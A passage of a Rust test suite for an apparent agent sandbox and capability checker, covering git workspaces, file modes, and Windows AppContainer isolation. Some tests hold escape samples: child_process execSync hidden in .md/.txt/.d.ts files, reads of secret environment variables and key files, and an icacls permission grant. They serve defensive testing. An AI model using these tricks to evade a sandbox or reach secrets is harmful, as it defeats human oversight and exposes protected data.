    denied(git::changes(&files, &bad, &policy), "Binary or oversized change unsupported");
}

#[test]
fn workspace_read_back_preserves_modes_and_tracked_node_modules() {
    let t = Temp::new();
    let repo = t.join("repo");
    sh(&t.0, &["init", "-q", "repo"]);
    sh(&repo, &["config", "core.autocrlf", "false"]);
    for (p, c) in [("bin/cli.js", "#!/usr/bin/env node\n"), ("src/tool.js", "module.exports = 1;\n"), ("test/fixtures/node_modules/dep/index.js", "module.exports = 2;\n")] {
        std::fs::create_dir_all(repo.join(p).parent().unwrap()).unwrap();
        std::fs::write(repo.join(p), c).unwrap();
    }
    sh(&repo, &["add", "-A"]);
    sh(&repo, &["update-index", "--chmod=+x", "bin/cli.js", "src/tool.js"]);
    sh(&repo, &["commit", "-qm", "base"]);
    let base = git::read_commit(&repo, &sh(&repo, &["rev-parse", "HEAD"]), 65536, 1048576).unwrap();
    assert_eq!((base["bin/cli.js"].mode.as_str(), base["src/tool.js"].mode.as_str()), ("100755", "100755"));
    let ws = t.join("ws");
    git::materialize(Some(&repo), &base, &ws, None).unwrap();
    // untracked tool state (an install, git metadata) stays invisible
    for (p, c) in [("node_modules/installed/index.js", "x"), ("test/fixtures/node_modules/dep/extra.js", "x"), (".git/HEAD", "x")] {
        std::fs::create_dir_all(ws.join(p).parent().unwrap()).unwrap();
        std::fs::write(ws.join(p), c).unwrap();
    }
    let policy = contract(&policy_value()).unwrap();
    let read = kern::local::read_workspace(&ws, &base, 65536, 1048576).unwrap();
    assert_eq!(git::changes(&base, &read, &policy).unwrap()["files"], json!([]), "an untouched workspace must read back as no change");
    // an edit keeps the committed mode
    std::fs::remove_file(ws.join("src/tool.js")).unwrap();
    std::fs::write(ws.join("src/tool.js"), "module.exports = 3;\n").unwrap();
    let edited = kern::local::read_workspace(&ws, &base, 65536, 1048576).unwrap();
    assert_eq!(edited["src/tool.js"].mode, "100755");
    assert_eq!(git::changes(&base, &edited, &policy).unwrap()["files"], json!([{ "path": "src/tool.js", "operation": "modify" }]));
}

#[test]
fn workspace_read_back_keeps_unchanged_large_assets_opaque() {
    let t = Temp::new();
    let repo = t.join("repo");
    sh(&t.0, &["init", "-q", "repo"]);
    std::fs::create_dir_all(repo.join("src")).unwrap();
    std::fs::write(repo.join("logo.bin"), vec![7u8; 2 * 1048576]).unwrap();
    std::fs::write(repo.join("src/a.js"), "module.exports = 1;\n").unwrap();
    sh(&repo, &["add", "-A"]);
    sh(&repo, &["commit", "-qm", "base"]);
    let base = git::read_commit(&repo, &sh(&repo, &["rev-parse", "HEAD"]), 65536, 1048576).unwrap();
    let ws = t.join("ws");
    git::materialize(Some(&repo), &base, &ws, None).unwrap();
    let policy = contract(&policy_value()).unwrap();
    let read = kern::local::read_workspace(&ws, &base, 65536, 1048576).unwrap();
    assert!(read["logo.bin"].bytes.is_none() && read["logo.bin"].oid == base["logo.bin"].oid);
    assert_eq!(git::changes(&base, &read, &policy).unwrap()["files"], json!([]));
    // a rewritten large asset is still refused
    std::fs::remove_file(ws.join("logo.bin")).unwrap();
    std::fs::write(ws.join("logo.bin"), vec![8u8; 2 * 1048576]).unwrap();
    denied(kern::local::read_workspace(&ws, &base, 65536, 1048576), "byte limits");
}

#[test]
fn capability_check_analyzes_data_files_that_node_would_execute() {
    let base = files(&[("src/a.js", "module.exports = 1;\n"), ("src/notes.md", "# Notes\n")]);
    let policy = contract(&policy_value()).unwrap();
    let none = std::collections::BTreeMap::new();
    let check = |c: &Files| { let changed = git::changes(&base, c, &policy).unwrap(); capability::check(&base, c, &changed, &none) };
    // CommonJS require() runs a file with an unregistered extension as JavaScript, and .d.ts as TypeScript
    for payload in ["p.txt", "p.md", "p.css", "p.html", "p.d.ts", "notes.md"] {
        let mut c = base.clone();
        c.insert(format!("src/{payload}"), file("require('child_process').execSync('id');\n"));
        c.insert("src/a.js".into(), file(&format!("require('./{payload}');\nmodule.exports = 1;\n")));
        denied(check(&c), "widens module capabilities");
    }
    // a declaration file is never loaded at runtime by legitimate code, so loading one is itself an escape
    let mut c = base.clone();
    c.insert("src/p.d.ts".into(), file("declare const x: number;\nrequire('child_process').execSync('id');\n"));
    c.insert("src/a.js".into(), file("require('./p.d');\nmodule.exports = 1;\n"));
    denied(check(&c), "widens module capabilities");
    for spec in ["./p.d.ts", "./P.D.TS", "./p.d.mts?v=1", "./p.d.cts#x", "./p%2ed.ts"] { assert!(caps("src/a.mjs", &format!("import '{spec}';")).iter().any(|c| c.starts_with("escape:")), "{spec}"); }
    // prose, stylesheets and declarations stay harmless
    let mut docs = base.clone();
    docs.insert("src/notes.md".into(), file("# Notes\n\nCall `fetch` with care.\n"));
    docs.insert("src/site.css".into(), file("a { color: red; }\n"));
    docs.insert("src/types.d.ts".into(), file("import { Readable } from 'node:stream';\nexport declare function add(a: number, b: number): number;\nexport function sub(a: number, b: number): number;\nexport interface S { r: Readable }\n"));
    docs.insert("src/a.js".into(), file("/** @type {import('./types.d.ts').S} */\nmodule.exports = 1;\n"));
    check(&docs).unwrap();
}

#[test]
fn capability_directory_baseline_ignores_declaration_files() {
    let base = files(&[("src/a.js", "module.exports = 1;\n"), ("src/types.d.ts", "import { ChildProcess } from 'child_process';\nexport declare function run(): ChildProcess;\n")]);
    let policy = contract(&policy_value()).unwrap();
    let mut c = base.clone();
    c.insert("src/evil.js".into(), file("require('child_process').exec('id');\n"));
    let changed = git::changes(&base, &c, &policy).unwrap();
    denied(capability::check(&base, &c, &changed, &std::collections::BTreeMap::new()), "widens module capabilities");
}

#[test]
fn capability_footprint_sees_aliased_process_module_and_global_objects() {
    for (code, cap) in [
        ("const p = process; p.env.SECRET;", "process:dynamic"), ("const { env } = process;", "process:dynamic"),
        ("const m = module; m.require('child_process');", "module:dynamic"), ("const g = globalThis; g.eval('1');", "global:dynamic"),
        ("(function (w) { w.fetch('https://x.invalid'); })(window);", "global:dynamic"),
    ] { assert!(caps("src/a.js", code).contains(&cap.to_string()), "{code} missing {cap}"); }
    // feature detection grants nothing
    assert_eq!(caps("src/a.js", "if (typeof process !== 'undefined' && typeof window === 'undefined' && typeof module === 'object' && typeof require === 'function') {}"), Vec::<String>::new());
}

#[test]
fn capability_footprint_treats_relative_imports_into_node_modules_as_packages() {
    assert_eq!(caps("src/a.js", "require('../node_modules/execa');\nimport('./node_modules/@scope/pkg/index.js');\nrequire('../Node_Modules/x/y');"), vec!["package:@scope/pkg", "package:execa", "package:x"]);
}

#[test]
fn pr_attestation_survives_crlf_bodies_from_web_edits() {
    let f = fixture();
    let d = promote::Decision { repository: "acme/project".into(), branch: format!("kern/fix-addition/{}", f.run_id), base: f.base.clone(), commit: f.commit.clone(), run_id: f.run_id.clone(), attestation: Value::Null };
    let body = promote::pr_body("fix-addition", &d, &f.envelope).unwrap();
    assert_eq!(promote::extract_attestation(&body.replace('\n', "\r\n")).unwrap(), f.envelope);
}

#[test]
fn operator_check_files_are_verifier_side_unix_paths_on_every_platform() {
    let mut v = operator_value(&["external"]);
    v["checks"][0]["file"] = json!("/operator/checks/addition.json");
    operator(&v).unwrap();
    v["checks"][0]["file"] = json!("checks/addition.json");
    denied(operator(&v), "absolute file");
}

#[cfg(unix)]
#[test]
fn materialized_executables_keep_their_execute_bit() {
    use std::os::unix::fs::PermissionsExt;
    let t = Temp::new();
    let repo = t.join("repo");
    sh(&t.0, &["init", "-q", "repo"]);
    std::fs::create_dir_all(repo.join("bin")).unwrap();
    std::fs::write(repo.join("bin/cli.js"), "#!/usr/bin/env node\n").unwrap();
    std::fs::write(repo.join("bin/big"), vec![b'x'; 2 * 1048576]).unwrap();
    std::fs::write(repo.join("README.md"), "x\n").unwrap();
    sh(&repo, &["add", "-A"]);
    sh(&repo, &["update-index", "--chmod=+x", "bin/cli.js", "bin/big"]);
    sh(&repo, &["commit", "-qm", "base"]);
    let base = git::read_commit(&repo, &sh(&repo, &["rev-parse", "HEAD"]), 65536, 1048576).unwrap();
    git::materialize(Some(&repo), &base, &t.join("out"), None).unwrap();
    let mode = |p: &str| std::fs::metadata(t.join("out").join(p)).unwrap().permissions().mode() & 0o777;
    assert_eq!((mode("bin/cli.js"), mode("bin/big"), mode("README.md")), (0o555, 0o555, 0o444));
}

#[test]
fn run_returns_at_its_deadline_even_if_a_background_process_holds_the_output() {
    let (exe, args): (PathBuf, Vec<String>) = if cfg!(windows) {
        (PathBuf::from(r"C:\Windows\System32\cmd.exe"), vec!["/c".into(), "start /b ping -n 30 127.0.0.1".into()])
    } else {
        (PathBuf::from("/bin/sh"), vec!["-c".into(), "sleep 30 &".into()])
    };
    let started = std::time::Instant::now();
    let r = run(&exe, &args, Run { timeout: std::time::Duration::from_secs(2), ..Default::default() });
    assert!(started.elapsed() < std::time::Duration::from_secs(10), "run() must honour its timeout, took {:?}", started.elapsed());
    denied(r, "background process");
}

#[cfg(windows)]
#[test]
fn windows_run_reports_unreadable_agent_output_as_blocked() {
    let t = Temp::new();
    let repo = t.join("repo");
    std::fs::create_dir_all(repo.join("src")).unwrap();
    sh(&t.0, &["init", "-q", "repo"]);
    std::fs::write(repo.join("src/add.mjs"), "export const add = (a, b) => a - b;\n").unwrap();
    sh(&repo, &["add", "-A"]);
    sh(&repo, &["commit", "-qm", "base"]);
    let base = sh(&repo, &["rev-parse", "HEAD"]);
    std::fs::write(t.join("task.json"), policy_value().to_string()).unwrap();
    let ps = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
    let job = json!({ "version": 1, "repo": win(&repo), "base": base, "contract": "./task.json", "tools": [], "network": false, "output": win(&t.join("runs")), "promote": true,
        "command": [ps, "-NoProfile", "-NonInteractive", "-Command", "[IO.File]::WriteAllText('src\\big.txt', ('x' * 100000))"] });
    std::fs::write(t.join("run.json"), job.to_string()).unwrap();
    let r = kern::local::local_run(&kern::local::run_job(&t.join("run.json")).unwrap()).unwrap();
    assert_eq!(r["status"], "BLOCKED", "{r}");
    assert!(r["summary"].as_str().unwrap().contains("byte limits"), "{r}");
    assert!(r["promotion"].is_null(), "{r}");
}

#[cfg(windows)]
fn icacls(args: &[&std::ffi::OsStr]) -> String { String::from_utf8_lossy(&Command::new(r"C:\Windows\System32\icacls.exe").args(args).output().unwrap().stdout).to_string() }

#[cfg(windows)]
#[test]
fn windows_box_enforces_denied_paths_without_touching_them() {
    let t = Temp::new();
    let (ws, tool, outside) = (t.join("ws"), t.join("tool"), t.join("outside"));
    for d in [&ws, &tool.join("private"), &outside.join("secrets")] { std::fs::create_dir_all(d).unwrap(); }
    std::fs::write(tool.join("private/key.txt"), "TOPSECRET").unwrap();
    std::fs::write(outside.join("secrets/key.txt"), "TOPSECRET").unwrap();
    std::fs::write(outside.join("shared.txt"), "shared").unwrap();
    icacls(&[outside.join("shared.txt").as_os_str(), "/grant".as_ref(), "*S-1-15-2-1:(R)".as_ref()]);
    let ps = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
    let job = |denied: &Path, script: &str| json!({ "version": 1, "workspace": win(&ws), "tools": [win(&tool)], "denied": [win(denied)], "network": false, "timeout_seconds": 60,
        "command": [ps, "-NoProfile", "-NonInteractive", "-Command", script] });
    // AppContainer access checks ignore deny entries, so an exception inside a grant cannot be enforced: refuse it
    denied(kern::local::box_job(&job(&tool.join("private"), "exit 0")), "inside the granted");
    // a path every app container may read cannot be denied without changing it: refuse it
    denied(kern::local::run_box_job(&kern::local::box_job(&job(&outside.join("shared.txt"), "exit 0")).unwrap()), "Every app container can read");
    // an enforceable denied path stays unreadable and its permissions are never modified
    let before = (icacls(&[outside.join("secrets").as_os_str()]), icacls(&[outside.join("secrets/key.txt").as_os_str()]));
    let script = "try{[IO.File]::ReadAllText('KEY') | Out-Null; Add-Content 'REP' 'K ALLOWED'}catch{Add-Content 'REP' 'K DENIED'}"
        .replace("KEY", &win(&outside.join("secrets/key.txt"))).replace("REP", &win(&ws.join("report.txt")));
    assert_eq!(kern::local::run_box_job(&kern::local::box_job(&job(&outside.join("secrets"), &script)).unwrap()).unwrap()["status"], "OK");
    assert!(std::fs::read_to_string(ws.join("report.txt")).unwrap().contains("K DENIED"));
    assert_eq!((icacls(&[outside.join("secrets").as_os_str()]), icacls(&[outside.join("secrets/key.txt").as_os_str()])), before);
}

#[cfg(windows)]
#[test]
fn windows_box_cannot_change_permissions_in_its_workspace() {
    let t = Temp::new();
    let ws = t.join("ws");
    std::fs::create_dir_all(&ws).unwrap();
    std::fs::write(ws.join("f.txt"), "x").unwrap();
    let job = json!({ "version": 1, "workspace": win(&ws), "tools": [], "denied": [], "network": false, "timeout_seconds": 60,
        "command": [r"C:\Windows\System32\icacls.exe", win(&ws.join("f.txt")), "/grant", "*S-1-15-2-1:(F)"] });
    kern::local::run_box_job(&kern::local::box_job(&job).unwrap()).unwrap();
    let acl = icacls(&[ws.join("f.txt").as_os_str()]);
    assert!(!acl.contains("ALL APPLICATION PACKAGES"), "the agent widened a workspace file's permissions: {acl}");
}

#[cfg(windows)]
#[test]
fn windows_box_grants_do_not_outlive_an_interrupted_run() {
    let t = Temp::new();
    let (ws1, ws2) = (t.join("ws1"), t.join("ws2"));
    std::fs::create_dir_all(&ws1).unwrap();
    std::fs::create_dir_all(&ws2).unwrap();
    std::fs::write(ws1.join("secret.txt"), "TOPSECRET").unwrap();
    let ps = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
    let first = json!({ "version": 1, "workspace": win(&ws1), "tools": [], "denied": [], "network": false, "timeout_seconds": 120,
        "command": [ps, "-NoProfile", "-NonInteractive", "-Command", format!("Set-Content -LiteralPath '{}' -Value x; Start-Sleep -Seconds 60", win(&ws1.join("started.txt")))] });
    std::fs::write(t.join("first.json"), first.to_string()).unwrap();
    let mut kern = Command::new(env!("CARGO_BIN_EXE_kern")).arg("box").arg(t.join("first.json")).stdout(std::process::Stdio::null()).spawn().unwrap();
    let started = std::time::Instant::now();
    while !ws1.join("started.txt").exists() {
        assert!(started.elapsed() < std::time::Duration::from_secs(60), "first box never started");
        std::thread::sleep(std::time::Duration::from_millis(50));
    }
    kern.kill().unwrap(); // interrupted: kern never gets to revoke its grants
    kern.wait().unwrap();
    let packages = PathBuf::from(std::env::var("LOCALAPPDATA").unwrap()).join("Packages");
    let orphans = || std::fs::read_dir(&packages).unwrap().flatten().filter(|e| e.file_name().to_string_lossy().starts_with(&format!("kern-box-{}-", kern.id()))).count();
    assert_eq!(orphans(), 1, "the interrupted run's identity is left behind");
    let script = "try{[IO.File]::ReadAllText('SEC') | Out-Null; Add-Content 'REP' 'S ALLOWED'}catch{Add-Content 'REP' 'S DENIED'}".replace("SEC", &win(&ws1.join("secret.txt"))).replace("REP", &win(&ws2.join("report.txt")));
    let second = json!({ "version": 1, "workspace": win(&ws2), "tools": [], "denied": [], "network": false, "timeout_seconds": 60,
        "command": [ps, "-NoProfile", "-NonInteractive", "-Command", script] });
    assert_eq!(kern::local::run_box_job(&kern::local::box_job(&second).unwrap()).unwrap()["status"], "OK");
    let report = std::fs::read_to_string(ws2.join("report.txt")).unwrap();
    assert!(report.contains("S DENIED"), "a later box must not reach an earlier run's workspace: {report}");
    assert_eq!(orphans(), 0, "the next box sweeps identities whose process is gone");
}
